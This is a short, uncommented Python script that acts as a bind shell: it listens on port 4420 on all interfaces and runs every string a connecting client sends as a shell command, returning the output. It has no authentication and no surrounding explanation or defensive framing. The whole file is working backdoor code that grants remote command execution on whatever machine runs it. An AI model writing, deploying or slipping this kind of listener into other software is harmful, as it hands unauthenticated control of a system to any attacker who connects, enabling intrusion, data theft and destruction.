#!/usr/bin/env python3
import socket,os,subprocess
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind(('0.0.0.0', 4420))
c.listen(1)
s,a = c.accept()
 
while True:
    data = s.recv(1024)
    if data.decode() == "quit": break
    elif data.decode()[:2] == "cd":
        try: os.chdir(data.decode()[3:])
        except: pass
    else:
        proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdoutput = proc.stdout.read() + proc.stderr.read()
        stdoutput.decode()
        s.sendall(stdoutput)
    s.sendall('EOFX'.encode())
# Loop ends here
s.send('Bye!'.encode())
s.close()
